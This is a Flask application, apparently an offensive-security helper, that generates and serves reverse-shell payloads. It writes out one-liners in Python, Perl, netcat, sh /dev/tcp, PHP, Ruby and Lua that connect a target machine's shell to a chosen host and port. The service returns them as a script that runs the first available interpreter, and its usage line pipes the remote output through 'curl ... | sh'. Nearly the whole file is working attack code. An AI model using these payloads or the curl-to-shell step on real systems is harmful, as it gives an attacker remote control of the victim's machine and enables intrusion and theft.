from flask import Flask
app = Flask(__name__)

def gen_payloads(host, port):
    payloads =  {
        "python":  "python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"{host}\",{port})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        "python3": "python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"{host}\",{port})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        "perl":    "perl -e 'use Socket;$i=\"{host}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
        "nc":      "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {host} {port} >/tmp/f",
        "sh":      "/bin/sh -i >& /dev/tcp/{host}/{port} 0>&1",
        "php":     "php -r '$sock=fsockopen(\"{host}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "ruby":    "ruby -rsocket -e'f=TCPSocket.open(\"{host}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        "lua":     "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{host}','{port}');os.execute('/bin/sh -i <&3 >&3 2>&3');\""
        }

    for i in payloads.keys():
        payloads[i] = payloads[i].replace("{host}",host)
        payloads[i] = payloads[i].replace("{port}",port)
    return payloads



@app.route("/")
def index():
    x ="""Usage:
curl rev.m3.wtf/10.13.37.10:9001 | sh
"""
    return x, {'content-type': 'text/plain'}


@app.route("/<string:addr>")
def endpoint(addr):

    addr = addr.split(":")
    host = addr[0]
    port = addr[1]

    payloads = gen_payloads(host,port)

    x = """# revshell_helper - github.com/morph3
"""
    x += f"# Host: {host} \n"
    x += f"# Port: {port} \n"

    for key,val in payloads.items():
        #x += f"{key} : {val}\n"

        foo = f"""
if command -v {key} > /dev/null 2>&1; then
        {val}
        exit;
fi;
        """
        x += foo

    return x, {'content-type': 'text/plain'}
